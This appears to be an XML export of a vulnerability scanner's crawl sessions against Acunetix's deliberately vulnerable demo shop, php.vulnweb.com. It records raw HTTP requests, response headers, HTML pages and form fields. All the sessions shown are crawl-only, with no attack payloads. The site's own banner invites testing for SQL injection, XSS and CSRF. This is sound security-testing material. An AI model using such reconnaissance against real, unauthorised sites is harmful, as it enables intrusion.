    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:53 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6453</Value></Header></Headers><SetCookies /><Forms><Form><Action>cart.php</Action><Method>POST</Method><Name>f_addcart</Name><OnSubmit /><InputFields><InputField><Name>price</Name><Value>1000</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>addcart</Name><Value>4</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name /><Value>add this picture to cart</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="CB7B12B9974E5BAE8896C397844A8F6D"><URL>http://php.vulnweb.com:80/product.php?pic=5</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="CB7B12B9974E5BAE8896C397844A8F6D"><![CDATA[GET /product.php?pic=5 HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php?cat=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="CB7B12B9974E5BAE8896C397844A8F6D";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="03e5192a";
X-Request-Memo: ID="0de53380";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:53 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6382

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Mean</h2><div class='story'><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $460</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='460'><input type='hidden' name='addcart' value='5'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="CB7B12B9974E5BAE8896C397844A8F6D"><Method>GET</Method><Path>/</Path><File>product</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pic=5</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pic</Name><Value>5</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/listproducts.php?cat=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="CB7B12B9974E5BAE8896C397844A8F6D";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="03e5192a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="0de53380";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture details</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<script language="javascript1.2">
<!--
	function popUpWindow(URLStr, left, top, width, height)
	{
	  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');
	}
-->
</script>
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Mean</h2><div class='story'><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='center' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a><h3>Short description</h3><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><h3>Long description</h3><p><p>
This picture is an 53 cm x 12 cm masterpiece.
</p>
<p>
This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information.This text is not meant to be read. This is being used as a place holder. Please feel free to change this by inserting your own information. 
</p></p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p>the price of this item is: $460</p></div><div class='story'><form name='f_addcart' method='POST' action='cart.php'><input type='hidden' name='price' value='460'><input type='hidden' name='addcart' value='5'><input type='submit' value='add this picture to cart'></form></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:53 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6382</Value></Header></Headers><SetCookies /><Forms><Form><Action>cart.php</Action><Method>POST</Method><Name>f_addcart</Name><OnSubmit /><InputFields><InputField><Name>price</Name><Value>460</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>addcart</Name><Value>5</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name /><Value>add this picture to cart</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="F425747E598F9ABB32C9C02592DFF52C"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-1/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="F425747E598F9ABB32C9C02592DFF52C"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="F425747E598F9ABB32C9C02592DFF52C";PSID="D0A7402B83800F606909C145FDDC0FB3";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ec180cea";
X-Request-Memo: ID="24e19399";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:54 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 100

<div>Thanks for buying <b> Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br></div>
				]]></RawResponse><Request id="F425747E598F9ABB32C9C02592DFF52C"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-1/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="F425747E598F9ABB32C9C02592DFF52C";PSID="D0A7402B83800F606909C145FDDC0FB3";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ec180cea";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="24e19399";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for buying <b> Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:54 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>100</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="64D21A7DC85A587EEA0D3D242B678FAC"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-2/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="64D21A7DC85A587EEA0D3D242B678FAC"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-2/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="64D21A7DC85A587EEA0D3D242B678FAC";PSID="6BDEF4BFB9439BD2321C1C813C3137C9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="54bbf1fe";
X-Request-Memo: ID="3e99a0c4";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:54 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 76

<div>Thanks for buying <b> Web Camera A4Tech PK-335E</b><br><br></div>
				]]></RawResponse><Request id="64D21A7DC85A587EEA0D3D242B678FAC"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-2/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="64D21A7DC85A587EEA0D3D242B678FAC";PSID="6BDEF4BFB9439BD2321C1C813C3137C9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="54bbf1fe";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="3e99a0c4";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for buying <b> Web Camera A4Tech PK-335E</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:54 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>76</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6C4F1E2F262544FF06983A5654F837CA"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-1.html</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="6C4F1E2F262544FF06983A5654F837CA"><![CDATA[GET /Mod_Rewrite_Shop/RateProduct-1.html HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
